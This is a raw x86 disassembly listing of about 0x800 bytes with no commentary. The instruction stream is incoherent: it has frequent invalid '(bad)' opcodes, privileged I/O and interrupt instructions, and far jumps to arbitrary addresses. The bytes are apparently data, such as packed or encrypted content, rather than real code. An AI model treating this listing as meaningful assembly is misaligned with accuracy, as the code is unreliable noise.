  4040a0:	pop    ss
  4040a1:	aaa    
  4040a2:	pop    ebx
  4040a3:	test   eax,0x937a77
  4040a8:	mov    ds:0x3b9cfac5,eax
  4040ad:	push   es
  4040ae:	mov    ebp,0x33372979
  4040b3:	or     BYTE PTR [esp+ebx*1],dl
  4040b6:	ror    DWORD PTR [eax],cl
  4040b8:	mov    bh,0x39
  4040ba:	stos   DWORD PTR es:[edi],eax
  4040bb:	or     eax,0xf5673a14
  4040c0:	arpl   ax,bp
  4040c2:	sub    DWORD PTR [eax+0x689035d9],ecx
  4040c8:	ret    0x5c77
  4040cb:	gs push ecx
  4040cd:	mov    eax,ds:0xd355afcf
  4040d2:	add    DWORD PTR ds:0xd7dad4f8,eax
  4040d8:	fnstenv [ebx+0x6b]
  4040db:	mov    ah,0x9d
  4040dd:	mov    bh,0x3b
  4040df:	addr16 mov edx,0x756662f2
  4040e5:	int3   
  4040e6:	cmp    dh,dl
  4040e8:	sar    BYTE PTR [eax-0x64],cl
  4040eb:	mov    esp,0xf557cc56
  4040f0:	jbe    0x4040af
  4040f2:	shl    cl,cl
  4040f4:	lea    ebx,[ecx+0x2ca30834]
  4040fa:	pop    bp
  4040fc:	out    dx,eax
  4040fd:	popf   
  4040fe:	inc    ecx
  4040ff:	pop    edi
  404100:	mov    bl,0xce
  404102:	mov    ds:0x4b92c923,eax
  404107:	test   eax,0xf8410bc4
  40410c:	xchg   edx,eax
  40410d:	iret   
  40410e:	pop    ds
  40410f:	adc    ah,dh
  404111:	xchg   ecx,eax
  404112:	or     al,0x83
  404114:	mov    esp,0x5312ade8
  404119:	dec    edi
  40411a:	inc    esp
  40411b:	sub    DWORD PTR [edx-0x51460054],edi
  404121:	add    eax,0xa21bdea0
  404126:	fs aas 
  404128:	adc    al,0xbd
  40412a:	je     0x4040d9
  40412c:	push   ds
  40412d:	fs jae 0x4040d7
  404130:	les    edx,FWORD PTR [ebp+0x1a]
  404133:	mov    WORD PTR [ebp+0xa],?
  404136:	xor    ecx,ecx
  404138:	adc    ah,BYTE PTR [esi]
  40413a:	call   0xcb92:0xdf473749
  404141:	fs sub al,0x32
  404144:	cmp    ebx,DWORD PTR [esi-0x2fbc778]
  40414a:	in     al,0x70
  40414c:	dec    ecx
  40414d:	and    al,0x46
  40414f:	data16 and BYTE PTR [edi+0x7],cl
  404153:	mov    bl,0x62
  404155:	imul   edi,DWORD PTR [ecx+0x33],0x8d423942
  40415c:	in     al,dx
  40415d:	shl    DWORD PTR [edx+0x48e6d34c],cl
  404163:	cmp    dh,ch
  404165:	and    eax,0xa62ca483
  40416a:	leave  
  40416b:	push   ds
  40416c:	addr16 (bad) 
  40416e:	nop
  40416f:	sub    ebx,DWORD PTR [eax+0x163dacff]
  404175:	inc    ebx
  404176:	enter  0x6a69,0x82
  40417a:	mov    DWORD PTR [esi-0x584b7325],eax
  404180:	mov    ds:0xabbbd846,eax
  404185:	pop    ss
  404186:	mov    esi,0x42d1e2fc
  40418b:	inc    ebx
  40418c:	fs pusha 
  40418e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40418f:	xchg   esp,eax
  404190:	push   ebp
  404191:	jo     0x404165
  404193:	dec    edx
  404194:	inc    ecx
  404195:	pop    ecx
  404196:	mov    esi,0xea6be2ba
  40419b:	sbb    ebp,DWORD PTR [ecx+ebx*2-0x4]
  40419f:	es and al,0xe5
  4041a2:	fisub  DWORD PTR [edx+0x2024c4a1]
  4041a8:	push   ecx
  4041a9:	jo     0x40418e
  4041ab:	adc    esp,DWORD PTR [ecx+0x6936e96c]
  4041b1:	jb     0x4041f3
  4041b3:	sbb    ebp,ecx
  4041b5:	das    
  4041b6:	scas   al,BYTE PTR es:[edi]
  4041b7:	jo     0x4041a2
  4041b9:	inc    ebp
  4041ba:	push   ebp
  4041bb:	add    BYTE PTR [ecx+ecx*1+0x55],dl
  4041bf:	mov    ch,0x3f
  4041c1:	jbe    0x40423e
  4041c3:	cmp    DWORD PTR [esi-0xbde4db9],esp
  4041c9:	ror    DWORD PTR [esi+0x43540dca],0x91
  4041d0:	pop    ecx
  4041d1:	and    al,0x10
  4041d3:	pop    ecx
  4041d4:	mov    ch,0xce
  4041d6:	push   es
  4041d7:	cmp    al,BYTE PTR [ebx]
  4041d9:	cdq    
  4041da:	sub    al,BYTE PTR [esi]
  4041dc:	xor    ch,BYTE PTR [edx+0x13]
  4041df:	sbb    BYTE PTR [ebx-0x634761ae],bh
  4041e5:	mov    ebx,0xaeab7e70
  4041ea:	mov    ds:0xdd274352,al
  4041ef:	retf   0x2a90
  4041f2:	cmc    
  4041f3:	popf   
  4041f4:	and    eax,0x69a485de
  4041f9:	sub    ebx,ebx
  4041fb:	xor    BYTE PTR ds:0x2b0d8394,bl
  404201:	loopne 0x404213
  404203:	jg     0x40424d
  404205:	das    
  404206:	ror    al,0x2d
  404209:	dec    esi
  40420a:	ins    BYTE PTR es:[edi],dx
  40420b:	jge    0x4041b1
  40420d:	cmp    ecx,DWORD PTR [edi+ebp*4]
  404210:	or     ah,BYTE PTR [eax-0x27]
  404213:	and    bh,dl
  404215:	sbb    eax,0xea7498d7
  40421a:	gs mov cl,0x71
  40421d:	push   edi
  40421e:	dec    ecx
  40421f:	dec    esp
  404220:	xor    BYTE PTR [ecx+ebx*8],al
  404223:	cmc    
  404224:	adc    eax,0xaab4bdd0
  404229:	cmp    DWORD PTR [ebp+0x7e],0x702c48ca
  404230:	sbb    al,0xfd
  404232:	push   ecx
  404233:	pushf  
  404234:	add    al,0xb0
  404236:	stos   BYTE PTR es:[edi],al
  404237:	std    
  404238:	pop    edx
  404239:	inc    ebx
  40423a:	push   ds
  40423b:	push   es
  40423c:	leave  
  40423d:	mov    ebp,0x42e1312e
  404242:	xor    al,0x15
  404244:	xchg   ebp,eax
  404245:	adc    edi,DWORD PTR [ebp-0x45]
  404248:	add    dl,dh
  40424a:	sbb    bh,ah
  40424c:	cmp    al,0x20
  40424e:	into   
  40424f:	pop    ss
  404250:	cmp    eax,0x7ae796f0
  404255:	pop    eax
  404256:	mov    ebp,0xec8043ac
  40425b:	pop    ss
  40425c:	out    0x66,eax
  40425e:	add    ebp,DWORD PTR [esi+0x25]
  404261:	jmp    0x2cc21d15
  404266:	cwde   
  404267:	lods   al,BYTE PTR ds:[esi]
  404268:	dec    ebx
  404269:	(bad)  [edx-0x32]
  40426c:	inc    esi
  40426d:	fist   WORD PTR [ebx-0x659755c7]
  404273:	adc    DWORD PTR [esi+ecx*8],ebx
  404276:	bound  ebx,QWORD PTR [edi]
  404278:	iret   
  404279:	and    al,0x5c
  40427b:	aaa    
  40427c:	das    
  40427d:	les    ebp,FWORD PTR [esp+eax*2+0x1e21589f]
  404284:	sub    ecx,DWORD PTR [edx-0x1850418c]
  40428a:	cmp    bh,0x6
  40428d:	xor    al,BYTE PTR [ecx]
  40428f:	pop    ebx
  404290:	loop   0x404230
  404292:	sub    ebx,DWORD PTR [ecx]
  404294:	in     al,0xc2
  404296:	das    
  404297:	pop    edx
  404298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404299:	mov    al,0xc4
  40429b:	mov    dh,0xc2
  40429d:	jo     0x4042db
  40429f:	not    ebp
  4042a1:	sti    
  4042a2:	test   al,0x83
  4042a4:	rol    BYTE PTR [edx],cl
  4042a6:	hlt    
  4042a7:	js     0x4042d7
  4042a9:	lock mov DWORD PTR [eax+0x63],ebx
  4042ad:	cmp    ebx,DWORD PTR [edx-0x29960e8d]
  4042b3:	push   ebx
  4042b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042b5:	jbe    0x40427d
  4042b7:	imul   edi,DWORD PTR [ecx+0x1],0xffffff9b
  4042bb:	cmp    al,0xa2
  4042bd:	lahf   
  4042be:	mov    al,0x70
  4042c0:	shr    BYTE PTR [edi+0x41b43de4],cl
  4042c6:	lods   al,BYTE PTR ds:[esi]
  4042c7:	mov    ebx,0xa09a83d
  4042cc:	mov    edi,0xc6308230
  4042d1:	push   es
  4042d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042d3:	mov    DWORD PTR [ecx],ebp
  4042d5:	add    DWORD PTR [ebx],0xffffffae
  4042d8:	mov    ebp,0x750d5122
  4042dd:	xlat   BYTE PTR ds:[ebx]
  4042de:	sub    esp,DWORD PTR [esi-0x7cbf5445]
  4042e4:	imul   ebx,DWORD PTR [ebx-0x10566cb1],0x76e0146e
  4042ee:	sub    al,0x9c
  4042f0:	and    ah,bl
  4042f2:	shl    DWORD PTR [edi-0x2bc5f28],1
  4042f8:	add    al,0x5b
  4042fa:	adc    al,0x41
  4042fc:	inc    esp
  4042fd:	ss add eax,0x2445c21f
  404303:	xor    DWORD PTR [ebp+edi*4-0xbe3b762],eax
  40430a:	stc    
  40430b:	mov    ah,0x1d
  40430d:	push   es
  40430e:	add    al,0xc1
  404310:	xchg   ebx,eax
  404311:	sub    dh,BYTE PTR [edi+0x4c]
  404314:	div    DWORD PTR [eax+0x73841eb]
  40431a:	outs   dx,DWORD PTR ds:[esi]
  40431b:	repz les edx,FWORD PTR [ebx]
  40431e:	std    
  40431f:	vmwrite ecx,DWORD PTR [edi]
  404322:	mov    eax,0xd757f81e
  404327:	mov    BYTE PTR fs:[edi-0x76c2045e],0xe
  40432f:	lock shl DWORD PTR [ebp+0x6111a6e0],1
  404336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404337:	push   0xffffff8c
  404339:	inc    edi
  40433a:	sbb    esp,edi
  40433c:	daa    
  40433d:	(bad)  
  40433e:	cmp    DWORD PTR [ebp-0x6a],ecx
  404341:	hlt    
  404342:	push   edx
  404343:	loopne 0x4042e0
  404345:	dec    eax
  404346:	mov    eax,0xa205165
  40434b:	jg     0x404333
  40434d:	int3   
  40434e:	shl    DWORD PTR [ecx-0x348e205e],cl
  404354:	aaa    
  404355:	sub    ch,cl
  404357:	sub    ebx,DWORD PTR [esi-0x708007e3]
  40435d:	sub    al,0x22
  40435f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404361:	imul   esi,DWORD PTR [esi+0x9c8f7df],0x6687810a
  40436b:	mov    WORD PTR [eax],gs
  40436d:	adc    BYTE PTR [ebx-0x63],ah
  404370:	xchg   esi,eax
  404371:	inc    ebx
  404372:	shr    DWORD PTR [esi+0x26],cl
  404375:	inc    ecx
  404376:	xchg   DWORD PTR ds:0xbaa220aa,esp
  40437c:	imul   eax,DWORD PTR [ebx-0x4d7138d],0xf5b3249b
  404386:	cld    
  404387:	test   eax,0x8629739a
  40438c:	adc    dx,WORD PTR [ebx+0x3984594c]
  404393:	pop    ecx
  404394:	adc    esi,esi
  404396:	in     al,dx
  404397:	jb     0x4043dc
  404399:	test   al,0x60
  40439b:	scas   al,BYTE PTR es:[edi]
  40439c:	daa    
  40439d:	jne    0x404398
  40439f:	push   ss
  4043a0:	sbb    DWORD PTR [ebx-0x50],edi
  4043a3:	dec    ebx
  4043a4:	aam    0xfc
  4043a6:	mov    edx,0x8ad3ba96
  4043ab:	mov    al,0x19
  4043ad:	popa   
  4043ae:	xor    BYTE PTR ds:0x6541fa71,0x25
  4043b5:	jg     0x4043f3
  4043b7:	inc    eax
  4043b8:	daa    
  4043b9:	jp     0x404380
  4043bb:	xor    BYTE PTR [ecx+0x42],dl
  4043be:	xchg   bh,ah
  4043c0:	or     edi,edx
  4043c2:	outs   dx,BYTE PTR ds:[esi]
  4043c3:	bound  ebp,QWORD PTR [edx]
  4043c5:	cmp    al,0x27
  4043c7:	pop    ebp
  4043c8:	rol    ebp,1
  4043ca:	xchg   ecx,eax
  4043cb:	mov    esp,0x404a7653
  4043d0:	inc    esp
  4043d1:	jg     0x404446
  4043d3:	sbb    bh,cl
  4043d5:	adc    DWORD PTR [ebx+0x77],ebx
  4043d8:	(bad)  
  4043d9:	pop    ebp
  4043da:	sbb    DWORD PTR [esi+0x4b],esi
  4043dd:	push   cs
  4043de:	jae    0x404410
  4043e0:	fdivr  DWORD PTR [ebx-0x74]
  4043e3:	push   eax
  4043e4:	out    0xc1,eax
  4043e6:	dec    eax
  4043e7:	mov    edi,0x3c1479ca
  4043ec:	retf   
  4043ed:	retf   
  4043ee:	adc    al,0x1e
  4043f0:	xchg   esi,eax
  4043f1:	nop
  4043f2:	fld    TBYTE PTR [edi+0x59]
  4043f5:	and    bl,bl
  4043f7:	bound  esi,QWORD PTR [esp+eax*1+0xabe727a]
  4043fe:	rcr    BYTE PTR [ecx-0x43],1
  404401:	xchg   esp,eax
  404402:	fnstenv [edi+esi*2-0x3b]
  404406:	xor    ebp,esi
  404408:	sahf   
  404409:	sub    edx,ebx
  40440b:	and    al,0x18
  40440d:	test   eax,0x83ed08e9
  404412:	push   ds
  404413:	jg     0x4043b6
  404415:	xor    DWORD PTR [edi],esi
  404417:	sar    BYTE PTR [edi+esi*1+0x1b],1
  40441b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40441c:	mov    ds:0x3603f08f,eax
  404421:	stc    
  404422:	int3   
  404423:	out    0xa7,al
  404425:	sub    BYTE PTR [edi-0x2c219b98],ch
  40442b:	dec    eax
  40442c:	(bad)  
  40442d:	(bad)  [edi+esi*2]
  404430:	sbb    eax,0x5028e537
  404435:	scas   eax,DWORD PTR es:[edi]
  404436:	cmp    al,0xe6
  404438:	inc    eax
  404439:	sahf   
  40443a:	pop    esp
  40443b:	jge    0x40440a
  40443d:	scas   eax,DWORD PTR es:[edi]
  40443e:	cmp    BYTE PTR [eax+ebp*8],0x2
  404442:	pop    esp
  404443:	and    BYTE PTR [esi+0x52],0xe9
  404447:	jae    0x4043ea
  404449:	mov    BYTE PTR [eax+0x3f],dl
  40444c:	sub    bl,BYTE PTR [eax-0x3e]
  40444f:	sbb    al,0x90
  404451:	mov    bl,0x33
  404453:	adc    bh,dl
  404455:	test   DWORD PTR [ebp-0x4a3c20ff],ebp
  40445b:	inc    ecx
  40445c:	and    ebp,DWORD PTR [esi-0x1d]
  40445f:	loopne 0x40446b
  404461:	cmp    eax,0x966e0617
  404466:	test   DWORD PTR [edi-0x9],esp
  404469:	jl     0x404419
  40446b:	mov    ds:0x182973f3,eax
  404470:	in     al,0x79
  404472:	(bad)  
  404473:	mov    ds:0x2a4392e3,al
  404478:	fdiv   st(3),st
  40447a:	cwde   
  40447b:	push   ss
  40447c:	xor    al,bl
  40447e:	shl    DWORD PTR [edx-0x7f],0xcb
  404482:	and    dl,BYTE PTR [esi+0xac7201e]
  404488:	call   0xbd55:0xcadf7338
  40448f:	shr    BYTE PTR [edx],1
  404491:	lock add BYTE PTR [ebx],ah
  404494:	mov    esi,0x9fe65c69
  404499:	pop    esi
  40449a:	clc    
  40449b:	je     0x404497
  40449d:	cmp    eax,ecx
  40449f:	mov    eax,0xe17da9d0
  4044a4:	push   0x692f308e
  4044a9:	xchg   ecx,eax
  4044aa:	test   eax,0xa6290294
  4044af:	js     0x4044e1
  4044b1:	mov    ch,0xa4
  4044b3:	or     DWORD PTR [esi-0x14],ebx
  4044b6:	jmp    0xdc05761d
  4044bb:	push   edi
  4044bc:	fmul   QWORD PTR [esi+0x685a30b]
  4044c2:	int3   
  4044c3:	adc    DWORD PTR [ebx+0x5c26776b],edi
  4044c9:	pop    es
  4044ca:	sbb    eax,0xa7d6f778
  4044cf:	iret   
  4044d0:	pop    esp
  4044d1:	sbb    DWORD PTR [edi-0x79],ecx
  4044d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044d5:	shr    dh,1
  4044d7:	out    dx,eax
  4044d8:	iret   
  4044d9:	lahf   
  4044da:	dec    edi
  4044db:	or     dl,dh
  4044dd:	xchg   ecx,eax
  4044de:	mov    ebx,0x9227cb91
  4044e3:	xchg   edx,eax
  4044e4:	pushf  
  4044e5:	(bad)  
  4044e6:	mov    esp,0x7e8c1255
  4044eb:	push   ebp
  4044ec:	addr16 or eax,0xef40d97f
  4044f2:	push   ds
  4044f3:	mov    eax,ds:0x5eea7f68
  4044f8:	aad    0x51
  4044fa:	sub    eax,0x3acf8c8
  4044ff:	lea    edi,[ecx+0x37]
  404502:	xor    al,0x6c
  404504:	xchg   DWORD PTR [ebx-0x54],edx
  404507:	jge    0x40454b
  404509:	or     DWORD PTR [edx],edx
  40450b:	ret    0xc733
  40450e:	loop   0x4044eb
  404510:	out    dx,eax
  404511:	retf   0xb2f1
  404514:	push   ecx
  404515:	cmc    
  404516:	cmp    BYTE PTR [edi+ecx*2-0x67],dl
  40451a:	mov    DWORD PTR [ecx-0x6a],ebx
  40451d:	sar    DWORD PTR [edi],cl
  40451f:	stos   BYTE PTR es:[edi],al
  404520:	hlt    
  404521:	sub    DWORD PTR [ebx+0x74],ecx
  404524:	push   eax
  404525:	xchg   DWORD PTR [ecx-0x78],ebp
  404528:	mov    eax,0x8a153eb0
  40452d:	cld    
  40452e:	mov    dh,0x45
  404530:	jns    0x40459f
  404532:	cs jb  0x4044d0
  404535:	inc    ebx
  404536:	repz jl 0x404575
  404539:	and    al,0xda
  40453b:	sub    al,BYTE PTR [edi-0x17]
  40453e:	sub    dh,bh
  404540:	mov    bh,0xb0
  404543:	mov    dl,0x22
  404545:	daa    
  404546:	jmp    0x404582
  404548:	lahf   
  404549:	add    esi,DWORD PTR [edi]
  40454b:	lods   eax,DWORD PTR ds:[esi]
  40454c:	int3   
  40454d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40454e:	out    0xf4,al
  404550:	jg     0x404564
  404552:	mov    dl,0xd
  404554:	jns    0x4044eb
  404556:	push   ecx
  404557:	adc    eax,0xb2ca5609
  40455c:	pop    esi
  40455d:	mov    WORD PTR [ebx],es
  40455f:	sub    eax,0xd5a8f4b7
  404564:	add    BYTE PTR [ebp+0x41bebb89],al
  40456a:	pop    ss
  40456b:	ins    BYTE PTR es:[edi],dx
  40456c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40456d:	ret    
  40456e:	daa    
  40456f:	mov    edi,0xb12c92b1
  404574:	ins    DWORD PTR es:[edi],dx
  404575:	add    al,0x92
  404577:	jnp    0x4045f5
  404579:	cmp    eax,0x75ea18c1
  40457e:	in     al,dx
  40457f:	(bad)  
  404580:	fisttp QWORD PTR [ebx-0x2e]
  404583:	ins    DWORD PTR es:[edi],dx
  404584:	push   ss
  404585:	mov    eax,0x44922303
  40458a:	js     0x4045b7
  40458c:	mov    cl,0x3d
  40458e:	enter  0x12a5,0xc2
  404592:	dec    ebp
  404593:	add    al,BYTE PTR [ebx+ebp*1-0x30]
  404597:	sti    
  404598:	sbb    al,0x27
  40459a:	into   
  40459b:	fs test al,0xa4
  40459e:	and    al,0x13
  4045a0:	or     DWORD PTR [ebx+0x3f5f2ea0],0xffffff9b
  4045a7:	push   edx
  4045a8:	test   al,0xf
  4045aa:	loopne 0x4045d1
  4045ac:	jae    0x4045c8
  4045ae:	test   al,0xae
  4045b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045b1:	sbb    DWORD PTR [ebx+eax*1],esp
  4045b4:	ja     0x4045df
  4045b6:	xor    DWORD PTR [edi],ebp
  4045b8:	cmp    ebx,ebx
  4045ba:	mov    dh,0xd4
  4045bc:	in     al,0xba
  4045be:	(bad)  
  4045bf:	jmp    0x40457a
  4045c1:	jl     0x404555
  4045c3:	dec    esp
  4045c4:	daa    
  4045c5:	cmp    DWORD PTR [edx+0x45],0x67
  4045c9:	aaa    
  4045ca:	loop   0x404621
  4045cc:	sahf   
  4045cd:	cmc    
  4045ce:	push   edi
  4045cf:	mov    cl,0x2a
  4045d1:	pop    es
  4045d2:	pop    ds
  4045d3:	fs push es
  4045d5:	stos   DWORD PTR es:[edi],eax
  4045d6:	jmp    0xdbb4a875
  4045db:	sbb    al,0xe4
  4045dd:	dec    esi
  4045de:	mov    ds:0xe21e6722,eax
  4045e3:	imul   BYTE PTR [edx+0x38]
  4045e6:	xor    al,0xa2
  4045e8:	mov    ds:0x876059f0,eax
  4045ed:	xchg   BYTE PTR [edx+ebp*2-0x349f6e64],ah
  4045f4:	jecxz  0x40466a
  4045f6:	daa    
  4045f7:	out    0xd7,al
  4045f9:	(bad)
  4045fe:	sub    edx,DWORD PTR [esi]
  404600:	inc    edi
  404601:	or     ecx,DWORD PTR [ecx+0x47b322ca]
  404607:	sar    BYTE PTR ds:0x18bdc052,1
  40460d:	sbb    bh,BYTE PTR [ecx-0x6d]
  404610:	addr16 sub eax,0x40d50697
  404616:	(bad)  
  404617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404618:	dec    ebp
  404619:	addr16 xchg edx,eax
  40461b:	cli    
  40461c:	lods   eax,DWORD PTR ds:[esi]
  40461d:	xchg   ebp,eax
  40461e:	mov    eax,ds:0xcf641031
  404623:	iret   
  404624:	(bad)  
  404625:	imul   BYTE PTR [ebx]
  404627:	test   DWORD PTR [eax+0x20],ecx
  40462a:	les    eax,FWORD PTR [esi]
  40462c:	dec    edx
  40462d:	pusha  
  40462e:	mov    ah,0x14
  404630:	or     al,0xf2
  404632:	inc    eax
  404633:	das    
  404634:	xchg   ebp,eax
  404635:	bound  eax,QWORD PTR [ebx+0x5496875c]
  40463b:	(bad)  
  40463c:	data16 repnz into 
  40463f:	add    eax,0x7adba850
  404644:	ins    BYTE PTR es:[edi],dx
  404645:	lahf   
  404646:	mov    ds:0xb9fc7c9e,eax
  40464b:	xlat   BYTE PTR ds:[ebx]
  40464c:	mov    DWORD PTR [edx+ecx*8+0x1b700b01],edi
  404653:	cmc    
  404654:	pop    ebx
  404655:	xchg   esi,eax
  404656:	adc    ecx,edx
  404658:	cld    
  404659:	dec    edx
  40465a:	lds    ecx,FWORD PTR [edx+0x1d00f714]
  404660:	ret    0xec02
  404663:	jmp    0xd8f6:0xb7bd4083
  40466a:	mov    bl,0x5f
  40466c:	push   es
  40466d:	add    al,0xf9
  40466f:	sub    al,0xeb
  404671:	xchg   edi,eax
  404672:	sti    
  404673:	call   0x5979:0x26d4d933
  40467a:	mov    ebp,0x81a28c37
  40467f:	pop    esp
  404680:	add    al,0x61
  404682:	xchg   esp,eax
  404683:	jp     0x4046d1
  404685:	mov    eax,edx
  404687:	clc    
  404688:	sbb    cl,BYTE PTR [edi+0x5fe789b9]
  40468e:	pop    ss
  40468f:	push   esp
  404690:	and    DWORD PTR [ecx-0x5d],edx
  404693:	cs pop ebp
  404695:	add    edi,DWORD PTR [ebp-0x3d]
  404698:	sbb    dl,BYTE PTR [esi]
  40469a:	push   edi
  40469b:	in     al,0x32
  40469d:	(bad)  
  40469e:	dec    esp
  40469f:	push   eax
  4046a0:	or     esi,edi
  4046a2:	test   ebx,0xebae008
  4046a8:	test   al,0x6a
  4046aa:	and    ebp,esp
  4046ac:	xchg   BYTE PTR [edx],cl
  4046ae:	mov    al,BYTE PTR [ecx-0x1e]
  4046b1:	mov    cl,0x9b
  4046b3:	inc    esp
  4046b4:	cmp    ebp,DWORD PTR [ebx]
  4046b6:	jne    0x40472e
  4046b8:	imul   esi,DWORD PTR [edx-0x2af5af78],0xffffffc9
  4046bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046c0:	mov    edx,0x4d369779
  4046c5:	mov    edi,0x775c5f45
  4046ca:	sub    BYTE PTR [ecx],dl
  4046cc:	outs   dx,DWORD PTR ds:[esi]
  4046cd:	xor    BYTE PTR gs:[eax],bl
  4046d0:	sahf   
  4046d1:	jg     0x404726
  4046d3:	test   bh,cl
  4046d5:	adc    cl,ch
  4046d7:	jb     0x404731
  4046d9:	sahf   
  4046da:	jne    0x40469b
  4046dc:	imul   esi,DWORD PTR [ecx-0x3aa4d747],0xc
  4046e3:	push   ds
  4046e4:	pop    ebp
  4046e5:	xor    eax,0x6a543f05
  4046ea:	imul   BYTE PTR [edx]
  4046ec:	stc    
  4046ed:	add    ch,BYTE PTR [eax]
  4046ef:	neg    BYTE PTR [esp+eax*8-0x11]
  4046f3:	dec    ebp
  4046f4:	push   ds
  4046f5:	pop    edx
  4046f6:	jbe    0x4046a0
  4046f8:	add    eax,0x459e0b5
  4046fd:	sbb    al,0x49
  4046ff:	sub    al,0x90
  404701:	xchg   ebx,eax
  404702:	cmp    al,0xe7
  404704:	mov    dl,0x2c
  404706:	mov    al,0xaa
  404708:	sub    al,0xf2
  40470a:	push   es
  40470b:	hlt    
  40470c:	retf   0xe4b6
  40470f:	jmp    0x5f69f85a
  404714:	sbb    BYTE PTR [ebx+0x123ad36e],bl
  40471a:	dec    esi
  40471b:	fiadd  WORD PTR [ebp+ebx*1+0x286512d1]
  404722:	pushf  
  404723:	fwait
  404724:	in     al,0x48
  404726:	push   ebp
  404727:	stc    
  404728:	shl    BYTE PTR [ecx+0x4a9dca1e],cl
  40472e:	bound  eax,QWORD PTR [edx+0x14]
  404731:	or     eax,0xb257b84b
  404736:	sti    
  404737:	xchg   esp,eax
  404738:	jno    0x40473a
  40473a:	mov    al,ds:0x4ef2cdc0
  40473f:	push   esp
  404740:	mov    WORD PTR ss:[edx-0x12],gs
  404744:	repz cmp BYTE PTR [esi-0xde7f05d],ah
  40474b:	addr16 jns 0x404777
  40474e:	push   ebp
  40474f:	sbb    al,0x8
  404751:	mov    BYTE PTR [eax],0x60
  404754:	mov    ebp,0xb478a7ab
  404759:	inc    esp
  40475a:	fst    st(0)
  40475c:	pop    ds
  40475d:	jmp    0x4047a2
  40475f:	or     BYTE PTR [ebp-0x4909792b],0x62
  404766:	out    dx,al
  404767:	in     eax,dx
  404768:	inc    ecx
  404769:	and    edi,ebx
  40476b:	dec    ebp
  40476c:	jae    0x404799
  40476e:	ret    0xf8c4
  404771:	sbb    BYTE PTR [eax+ebx*4+0x775bd4ea],dl
  404778:	cdq    
  404779:	les    esi,FWORD PTR [edx+0x65]
  40477c:	xchg   esp,eax
  40477d:	pushf  
  40477e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477f:	fsubr  QWORD PTR [eax+0x6db3559a]
  404785:	cmp    ebp,DWORD PTR [eax+0x10]
  404788:	mov    ecx,0x823f85f9
  40478d:	inc    ecx
  40478e:	jmp    0xafdb:0x29137e58
  404795:	push   esp
  404796:	loope  0x404768
  404798:	clc    
  404799:	fwait
  40479a:	or     DWORD PTR [ebp-0x2f2180b8],esi
  4047a0:	retf   0xd19a
  4047a3:	jle    0x404803
  4047a5:	mov    edi,gs
  4047a7:	push   ss
  4047a8:	out    dx,eax
  4047a9:	(bad)  
  4047aa:	fs sub al,BYTE PTR es:0xa13fa106
  4047b2:	adc    al,0xec
  4047b4:	sbb    eax,0x4b1efc75
  4047b9:	iret   
  4047ba:	cmp    eax,0x75b0a605
  4047bf:	inc    ecx
  4047c0:	cli    
  4047c1:	mov    eax,0xba6cdeb9
  4047c6:	dec    edx
  4047c7:	mov    ds:0xe0bbb54c,eax
  4047cc:	push   eax
  4047cd:	inc    edx
  4047ce:	pop    esi
  4047cf:	lea    esi,[ecx+0x43]
  4047d2:	jmp    0x2c93d651
  4047d7:	xlat   BYTE PTR ds:[ebx]
  4047d8:	stc    
  4047d9:	push   ebx
  4047da:	clc    
  4047db:	fcom   QWORD PTR [eax+0xc83db13]
  4047e1:	sti    
  4047e2:	inc    edx
  4047e3:	adc    DWORD PTR [ebp+0x1d],esp
  4047e6:	dec    edi
  4047e7:	aaa    
  4047e8:	mov    ebx,DWORD PTR [esi+0x30]
  4047eb:	adc    al,0x12
  4047ed:	jb     0x40480c
  4047ef:	rol    DWORD PTR [ecx+ebp*8+0x187336f9],cl
  4047f6:	push   0xffffff8e
  4047f8:	jnp    0x404868
  4047fa:	std    
  4047fb:	test   ch,cl
  4047fd:	ins    DWORD PTR es:[edi],dx
  4047fe:	fiadd  DWORD PTR [esi]
  404800:	out    dx,al
  404801:	add    edx,esi
  404803:	xor    eax,0x1e10c880
  404808:	loopne 0x404850
  40480a:	scas   eax,DWORD PTR es:[edi]
  40480b:	es and eax,0xe2ded375
  404811:	push   ecx
  404812:	and    bl,BYTE PTR [esp+ecx*4]
  404815:	sub    BYTE PTR [edx+0x1b],ah
  404818:	xadd   BYTE PTR [ecx-0x362cde7d],bh
  40481f:	fadd   DWORD PTR [edx+ebx*4-0x6e]
  404823:	ds aam 0x11
  404826:	cmp    ebx,DWORD PTR [ecx]
  404828:	out    dx,al
  404829:	jns    0x404806
  40482b:	mov    ebp,0x6733b2a3
  404830:	leave  
  404831:	inc    esi
  404832:	and    eax,0xa7e4b121
  404837:	inc    ebx
  404838:	pop    ebp
  404839:	jecxz  0x404871
  40483b:	pop    ss
  40483c:	and    ch,ch
  40483e:	addr16 jo 0x404845
  404841:	loope  0x40484f
  404843:	sub    BYTE PTR [esi+edi*4+0x79],dl
  404847:	pop    ss
  404848:	dec    eax
  404849:	rcr    DWORD PTR [ecx+ebx*8],1
  40484c:	out    0x23,eax
  40484e:	push   ss
  40484f:	pop    esi
  404850:	dec    edi
  404851:	or     BYTE PTR [edx],bl
  404853:	fs adc al,0xba
  404856:	push   ebx
  404857:	sub    eax,0x7fde0e79
  40485c:	add    cl,BYTE PTR [edi+0x58]
  40485f:	js     0x404802
  404861:	dec    edx
  404862:	lahf   
  404863:	and    DWORD PTR [edi+0x7e],edi
  404866:	gs inc eax
  404868:	mov    bh,0x40
  40486a:	shl    DWORD PTR [eax],1
  40486c:	lahf   
  40486d:	jge    0x404817
  40486f:	leave  
  404870:	mov    bl,0x17
  404872:	out    dx,al
  404873:	or     DWORD PTR [ebp+0x31],edi
  404876:	jmp    0x4048f5
  404878:	sar    DWORD PTR [ebp+edi*8+0x59],0x9a
  40487d:	js     0x4048d3
  40487f:	jae    0x404802
  404881:	dec    esi
